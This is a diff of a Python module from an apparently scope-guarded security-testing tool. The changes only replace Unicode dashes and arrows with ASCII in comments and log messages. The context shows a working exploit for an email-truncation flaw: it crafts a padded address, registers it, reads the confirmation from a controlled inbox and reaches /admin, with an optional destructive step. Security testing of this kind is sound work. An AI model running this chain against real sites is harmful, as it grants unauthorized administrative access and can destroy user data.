@@ -7,16 +7,16 @@ while the mailer still sends the confirmation to the full (untruncated) address.
 
 That discrepancy is exploitable: craft an email whose local part is padded so that
 
-    <pad>@<privileged-domain>                      (first N chars — what gets STORED)
-    <pad>@<privileged-domain>.<your-inbox-domain>  (full address — what mail is SENT to)
+    <pad>@<privileged-domain>                      (first N chars - what gets STORED)
+    <pad>@<privileged-domain>.<your-inbox-domain>  (full address - what mail is SENT to)
 
 are the same string up to the truncation limit N. The confirmation lands in your
 inbox (the full address is a deliverable subdomain you control), but the app files
-you under the privileged domain → administrative access.
+you under the privileged domain -> administrative access.
 
-Chain: GET /register (scrape priv domain + csrf) → register the padded email →
-read the confirmation link from the email client → confirm → log in → reach
-/admin → (optional, opt-in) perform the destructive objective and check solved.
+Chain: GET /register (scrape priv domain + csrf) -> register the padded email ->
+read the confirmation link from the email client -> confirm -> log in -> reach
+/admin -> (optional, opt-in) perform the destructive objective and check solved.
 
 Cross-host by design: the email client is usually a second host that MUST be in
 `authorized_base_urls`. Everything stays scope-guarded.
@@ -100,7 +100,7 @@ def craft_truncation_email(priv_domain: str, inbox_domain: str, limit: int) -> s
     if pad_len < 1:
         return None                      # priv domain alone already exceeds the limit
     pad = "a" * pad_len
-    # Full address is a real subdomain of the inbox host → confirmation is delivered.
+    # Full address is a real subdomain of the inbox host -> confirmation is delivered.
     return f"{pad}{suffix}.{inbox_domain}"
 
 
@@ -133,7 +133,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         reg_html = reg.text if reg else ""
         priv = (scope.privileged_email_domain or _scrape_priv_domain(reg_html)).lower().rstrip(".")
         if not priv:
-            logger.info("exceptional-input: no privileged domain found/configured — skipping")
+            logger.info("exceptional-input: no privileged domain found/configured - skipping")
             return []
         email = craft_truncation_email(priv, inbox_domain, limit)
         if not email:
@@ -155,7 +155,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         inbox = await mail.request("GET", ec.path or "/email", follow_redirects=True)
         link = _find_confirm(inbox.text if inbox else "", lab_host, marker="@" + priv)
         if not link:
-            logger.info("exceptional-input: no confirmation link found in inbox — aborting")
+            logger.info("exceptional-input: no confirmation link found in inbox - aborting")
             return []
         cr = await lab.request("GET", _rel(link), follow_redirects=True)
         steps.append(TestStep(step=3, description="confirm email via inbox link",
@@ -173,7 +173,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
         steps.append(TestStep(step=5, description="access /admin panel", method="GET", path="/admin",
                               actual_status=getattr(adm, "status_code", None)))
         if not adm_ok:
-            logger.info("exceptional-input: /admin not reachable (status=%s) — bypass not achieved",
+            logger.info("exceptional-input: /admin not reachable (status=%s) - bypass not achieved",
                         getattr(adm, "status_code", None))
             return []
 
@@ -200,7 +200,7 @@ async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
             hypothesis=("Inconsistent handling of exceptional input: the registration email is "
                         f"stored in a fixed-width field truncated to {limit} chars while the mailer "
                         "uses the full address. A padded email truncating to "
-                        f"'@{priv}' grants the privileged (staff) domain → administrative access."),
+                        f"'@{priv}' grants the privileged (staff) domain -> administrative access."),
             risk_rating=Severity.CRITICAL,
             affected_endpoint="POST /register",
             business_impact="Any anonymous user gains full administrative access (incl. deleting users).",
